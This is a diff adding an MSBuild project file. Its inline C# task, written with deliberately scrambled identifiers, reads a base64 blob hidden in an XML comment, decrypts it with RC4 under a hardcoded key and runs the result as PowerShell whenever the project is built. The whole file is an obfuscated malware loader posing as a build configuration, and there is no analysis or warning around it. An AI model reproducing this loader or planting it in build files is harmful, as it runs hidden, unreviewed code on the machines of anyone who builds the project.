@@ -1,0 +1,119 @@
+<!--
+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
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="HYSlxSo">
+   <HYSlxSo />
+   <FFLHTpaityrho />
+   </Target>
+  <UsingTask
+    TaskName="HYSlxSo"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+	  <Using Namespace="System.IO" />
+      <Code Type="Fragment" Language="cs">
+      </Code>
+    </Task>
+	</UsingTask>
+	<UsingTask
+    TaskName="FFLHTpaityrho"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		using System;
+		using System.IO;
+		using System.Text;
+		using System.Management.Automation;
+		using System.Collections.Generic;
+		using System.Collections.ObjectModel;
+		using Microsoft.Build.Utilities;
+		using Microsoft.Build.Framework;
+		using System.Management.Automation.Runspaces;
+		
+		public class FFLHTpaityrho :  Task, ITask {	
+			public override bool Execute() {
+				string[] LdzhNvcG = Environment.GetCommandLineArgs();
+			
+				Runspace XsIYHRSy = RunspaceFactory.CreateRunspace();
+				XsIYHRSy.Open();
+				RunspaceInvoke fNPGAxqVyDFLcrmoCnIt = new RunspaceInvoke(XsIYHRSy);
+				Pipeline vMhjLErLxsgjcAJicSLniLti = XsIYHRSy.CreatePipeline();
+				
+				StreamReader IslimnqkhXIusngcIeL = File.OpenText(LdzhNvcG[1]);
+				StringBuilder xScyIdBotrNKKfdWDUrIsmxo = new StringBuilder();
+				string FWVwaFLKnsbiwkXDBlXsZtq;
+				while((FWVwaFLKnsbiwkXDBlXsZtq = IslimnqkhXIusngcIeL.ReadLine()) != null) {
+						if(String.Equals(FWVwaFLKnsbiwkXDBlXsZtq, "-->")) {
+							byte[] gLavzNXTvmsFvHdTSlxgDaR = {0x6b, 0x9a, 0x49, 0xff, 0xfc, 0x90, 0x46, 0x37, 0x54, 0x11, 0x96, 0xdb, 0x8a, 0x20, 0x1e, 0x86, 0xd4, 0xf9, 0xf1, 0xa3, 0xe2, 0x1d, 0x3a, 0x7f, 0x16, 0x6b, 0x89, 0x39, 0xf6, 0x0c, 0x8a, 0x07};
+							byte[] voixWLMxMEUQn = Convert.FromBase64String(xScyIdBotrNKKfdWDUrIsmxo.ToString());
+							string qeNmomFwrz = Encoding.UTF8.GetString(zbchuFvAuPaxslMp.DcKClus(gLavzNXTvmsFvHdTSlxgDaR, voixWLMxMEUQn));
+						
+							vMhjLErLxsgjcAJicSLniLti.Commands.AddScript(qeNmomFwrz);
+							vMhjLErLxsgjcAJicSLniLti.Commands.Add("Out-String");
+							Collection<PSObject> GlVHnHasZHGMdD = vMhjLErLxsgjcAJicSLniLti.Invoke();
+							XsIYHRSy.Close();
+							
+							StringBuilder KtRBMSuKXVPhOCs = new StringBuilder();
+							foreach(PSObject DnmAkzLxJuwWn in GlVHnHasZHGMdD) {
+								KtRBMSuKXVPhOCs.AppendLine(DnmAkzLxJuwWn.ToString());
+							}
+							Console.Write(KtRBMSuKXVPhOCs.ToString());
+							return true;
+						}
+						if(!String.Equals(FWVwaFLKnsbiwkXDBlXsZtq, "<!--")) {
+							xScyIdBotrNKKfdWDUrIsmxo.AppendLine(FWVwaFLKnsbiwkXDBlXsZtq);
+						}
+				}
+				return true;
+			}
+		}
+		
+		public class zbchuFvAuPaxslMp {
+			public static byte[] SCHepAiKQhchhD(byte[] ftkJtNqGrNqsm, byte[] dQonhTAErEnLazZdKKZMtr) {
+				int VWiPvgNzbKe, fDBFAr, OBqGjRmuxtFLsOTL, fYkeRmcclFbBRRjlE, nRZwBbY;
+				int[] mnLQffEIGS, ubLFPlrTOzqtVCm;
+				byte[] NJpzDaWQBiqzCSFnIqESE;
+
+				mnLQffEIGS = new int[256];
+				ubLFPlrTOzqtVCm = new int[256];
+				NJpzDaWQBiqzCSFnIqESE = new byte[dQonhTAErEnLazZdKKZMtr.Length];
+
+				for (fDBFAr = 0; fDBFAr < 256; fDBFAr++) {
+					mnLQffEIGS[fDBFAr] = ftkJtNqGrNqsm[fDBFAr % ftkJtNqGrNqsm.Length];
+					ubLFPlrTOzqtVCm[fDBFAr] = fDBFAr;
+				}
+				for (OBqGjRmuxtFLsOTL = fDBFAr = 0; fDBFAr < 256; fDBFAr++) {
+					OBqGjRmuxtFLsOTL = (OBqGjRmuxtFLsOTL + ubLFPlrTOzqtVCm[fDBFAr] + mnLQffEIGS[fDBFAr]) % 256;
+					nRZwBbY = ubLFPlrTOzqtVCm[fDBFAr];
+					ubLFPlrTOzqtVCm[fDBFAr] = ubLFPlrTOzqtVCm[OBqGjRmuxtFLsOTL];
+					ubLFPlrTOzqtVCm[OBqGjRmuxtFLsOTL] = nRZwBbY;
+				}
+				for (VWiPvgNzbKe = OBqGjRmuxtFLsOTL = fDBFAr = 0; fDBFAr < dQonhTAErEnLazZdKKZMtr.Length; fDBFAr++) {
+					VWiPvgNzbKe++;
+					VWiPvgNzbKe %= 256;
+					OBqGjRmuxtFLsOTL += ubLFPlrTOzqtVCm[VWiPvgNzbKe];
+					OBqGjRmuxtFLsOTL %= 256;
+					nRZwBbY = ubLFPlrTOzqtVCm[VWiPvgNzbKe];
+					ubLFPlrTOzqtVCm[VWiPvgNzbKe] = ubLFPlrTOzqtVCm[OBqGjRmuxtFLsOTL];
+					ubLFPlrTOzqtVCm[OBqGjRmuxtFLsOTL] = nRZwBbY;
+					fYkeRmcclFbBRRjlE = ubLFPlrTOzqtVCm[((ubLFPlrTOzqtVCm[VWiPvgNzbKe] + ubLFPlrTOzqtVCm[OBqGjRmuxtFLsOTL]) % 256)];
+					NJpzDaWQBiqzCSFnIqESE[fDBFAr] = (byte)(dQonhTAErEnLazZdKKZMtr[fDBFAr] ^ fYkeRmcclFbBRRjlE);
+				}
+				return NJpzDaWQBiqzCSFnIqESE;
+			}
+
+			public static byte[] DcKClus(byte[] pxhRACfKwMqQ, byte[] jbxcRhuHjjHIe) {
+				return SCHepAiKQhchhD(pxhRACfKwMqQ, jbxcRhuHjjHIe);
+			}
+		}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
